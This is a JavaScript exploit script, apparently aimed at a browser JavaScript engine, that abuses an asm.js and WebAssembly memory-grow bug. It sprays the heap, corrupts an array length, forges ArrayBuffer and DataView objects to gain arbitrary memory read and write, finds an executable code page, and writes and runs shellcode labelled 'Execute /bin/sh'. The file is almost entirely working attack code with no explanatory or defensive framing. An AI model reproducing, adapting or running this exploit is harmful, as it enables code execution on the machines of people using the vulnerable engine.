function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
let f32 = new Float64Array(1);
let uu32 = new Uint32Array(f32.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function u2d_32(v) {
    uu32[0] = v;
    return f32[0];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}


var victim_array = [];
victim_array.length = 0x750;
var array = [1.1];
array.length = 0x10000;
array.fill(2.2);
function spray_heap() {
    for(var i = 0;i < victim_array.length;i++){
        victim_array[i] = array.slice(0,array.length);
    }
}


// need spray value...

let loop = "";
for(let i = 0; i < 0xd0; i++) {
    loop += `fl[${0x20041 + 0x100 * i}] = x;
    fl[${0x20042 + 0x100 * i}] = x;
    fl[${0x20043 + 0x100 * i}] = x;
    `;
}

let eval_str = `
function module(stdlib, foreign, buffer) {
    "use asm";
    var fl = new stdlib.Uint32Array(buffer);
    function foo(x) {
        x = x | 0;
        ${loop}
    }
    return foo;
}
`
eval(eval_str);
let o = {Uint32Array: Uint32Array};
let env = {};
let memory = new WebAssembly.Memory({initial: 200});
let buffer = memory.buffer;
f = module(o, env, buffer);
trigger = {};
trigger.toString = function(){    
    spray_heap();
    return 0xffffffff;
}
f(1);
memory.grow(1);
f(trigger);
corrupted_array = undefined;

for(let i = 0; i < victim_array.length; i++) {
    tmp = victim_array[i];
    if (tmp[0] !== 2.2) {
        t = d2u(tmp[0]);
        console.log(hex(t[0], t[1]));
        console.log("[-] array at : " + i);
        corrupted_array = victim_array[i];
        break;
    }
}

let next_array_idx = undefined;
if (corrupted_array != undefined) {
    corrupted_array.length = 0x23ffffff;
    let leaked_idx = undefined;
    if (corrupted_array[0x20000] == 2.2) {
        corrupted_array[0x20000] = 0xdada;
        for(let i = 0; i < victim_array.length; i++) {
            tmp = victim_array[i];
            if (tmp[0] == 0xdada) {
                tmp = undefined;
                console.log("[-] next array at : " + i);
                next_array_idx = i;
                break;
            }
        }
    }
} else {
    console.log("[-] fail");
}

victim_array[next_array_idx] = null;
gc();
victim_array.length = 0x250

// Array map -> Just Array (smi -> double -> array)
for(let i = 0; i < 0x250; i++) {
    victim_array[i] = [0x1337, 1.1, {}];
    victim_array[i].length = 0x2000;
    victim_array[i].fill(i);
}

/*

-*-ArrayBuffer Memory Overview-*-
0x37e89830:    0x35b847b9    0x3408412d    0x3408412d    0x00002000
0x37e89840:    0x578bea00    0x578bea00    0x00001000    0x00000004
0x37e89850:    0x00000000    0x00000000    0xdeadbeef    0xdeadbeef

-*-DataView Memory Overview-*-
0x3b384678:    0x47e04129    0x12080008    0x000900c8    0x082003ff
0x3b384688:    0x432879bd    0x43287949    0x00000000    0x5a10411d
*/

let fake_obj = [
    /* DataView map(fail) -> ArrayBuffer map*/
    u2d(0, 0x0f0a000a),
    u2d(0x000900c6, 0x082003ff),
    u2d(0, 0),        // ArrayBuffer's __proto__
    u2d(0, 0),
    /* ArrayBuffer */
    u2d(0, 0),
    u2d(0, 0x1000),
    u2d(0xdeadbeef, 0xdeadbeef),        // ArrayBuffer's backing_store
    u2d(0x800, 4),
    u2d(0, 0)
].slice(0);

let fake_obj_ele_addr = undefined;
let arraybuffer_addr = undefined;
let ab = new ArrayBuffer(0x400);
let new_array_idx = d2u(corrupted_array[0x20000])[0] / 2;

if (new_array_idx >= 0 && new_array_idx < 0x250) {
    //console.log("[-] new_array at : " + new_array_idx);
    victim_array[new_array_idx][0] = fake_obj;
    fake_obj_lo = d2u(corrupted_array[0x20000])[0];
    fake_obj_hi = d2u(corrupted_array[0x20000])[1];
    fake_obj_ele_addr = fake_obj_lo - 1 + 24;
    arraybuffer_addr = fake_obj_ele_addr + 0x20;
    console.log("[-] fake obj : " + hex(fake_obj_lo, 0));
    console.log("[-] fake obj elements : " + hex(fake_obj_ele_addr, 0));
    console.log("[-] fake ArrayBuffer : " + hex(arraybuffer_addr, 0));
}
else {
    console.log("[-] fail to find array : " + new_array_idx);
}

let fake_dv_obj = [
    u2d(fake_obj_ele_addr + 1, 0),
    u2d(0, arraybuffer_addr + 1),
    u2d(0, 0x40000000),
    u2d(0, 0),
].slice(0);
function rwx_page(x) {
    return x + 10 * 10 / 5;
}

rwx_page(10);
// leak code space value
victim_array[new_array_idx][0] = rwx_page;
let code_obj = d2u(corrupted_array[0x20000])[0];
victim_array[new_array_idx][0] = fake_dv_obj;
let fake_dv_obj_addr = d2u(corrupted_array[0x20000])[0] + 0x1c - 1;
victim_array[new_array_idx][0] = ab.__proto__;
let ab_proto = d2u(corrupted_array[0x20000])[0];

console.log("[-] code obj : " + hex(code_obj, 0));
console.log("[-] fake dv obj : " + hex(fake_dv_obj_addr, 0));
console.log("[-] ab_proto : " + hex(ab_proto, 0));

fake_obj[2] = u2d(ab_proto, 0);
fake_obj[4] = u2d(fake_obj_ele_addr + 1, 0);
fake_obj[6] = u2d(code_obj - 1, code_obj - 1);
victim_array[new_array_idx][0] = fake_obj;
corrupted_array[0x20000] = u2d(arraybuffer_addr + 1, 0);
let fake_ab = victim_array[new_array_idx][0];

/* Arbitrary Read and Write */
let dv = new DataView(fake_ab);
code_rwx = dv.getUint32(24, true) + 64 - 1;
console.log("[-] code_rwx : " + hex(code_rwx, 0));

/* Execute /bin/sh */
shellcode = [795371626, 1752379183, 1852400175, 23651209, 2164326657, 1769088052, 3375431937, 1493461585, 2303844609, 1792160225, 2160941067];
fake_obj[6] = u2d(code_rwx, code_rwx);
for(let i = 0; i < shellcode.length; i++) {
    dv.setUint32(i * 4, shellcode[i], true);
}
rwx_page(10);
